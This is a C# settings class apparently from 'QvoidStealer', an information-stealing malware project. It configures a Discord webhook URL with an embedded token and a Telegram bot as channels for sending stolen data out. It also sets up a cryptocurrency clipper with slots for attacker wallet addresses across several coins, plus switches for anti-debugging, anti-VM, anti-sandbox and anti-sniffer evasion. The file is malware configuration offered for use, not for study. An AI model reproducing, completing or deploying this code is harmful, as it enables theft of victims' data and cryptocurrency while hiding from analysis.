﻿using QvoidWrapper;

namespace QvoidStealer.Main
{
    class Settings
    {
        public static DiscordWebhook Webhook = new DiscordWebhook("https://discord.com/api/webhooks/1047972366912851999/45Ker-7MMu5yBIoi6iK9_1COSWaaJlzhBs37jy7kPD7x_WKGtJTPY8cu92Go1h1gh87c");
        public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
        public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");

        public static bool Silent = false;
        public static bool AntiWebSinffers = false;
        public static bool AntiDebug = false;
        public static bool AntiVM = false;
        public static bool AntiSandBoxie = false;
        public static bool AntiEmulation = false;
    }
}
